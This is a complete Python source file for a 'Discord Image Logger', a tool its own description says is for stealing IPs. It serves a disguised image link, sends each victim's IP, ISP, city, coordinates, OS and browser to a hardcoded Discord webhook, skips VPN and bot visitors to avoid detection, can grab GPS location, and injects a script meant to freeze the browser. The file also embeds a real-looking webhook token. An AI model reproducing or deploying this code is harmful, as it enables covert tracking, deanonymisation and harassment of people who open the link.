# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1336019986656792647/kFhWqpMf7bOgBW-ymb0KLC1kAFk2WiF_rajBcaDc0gQakaB559_1H0WJQLLy6vTxy0XQ",
    "image": "data:image/jpeg;base64,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.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Enable the custom message?
        "message": "You been ddos have nice day :)", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
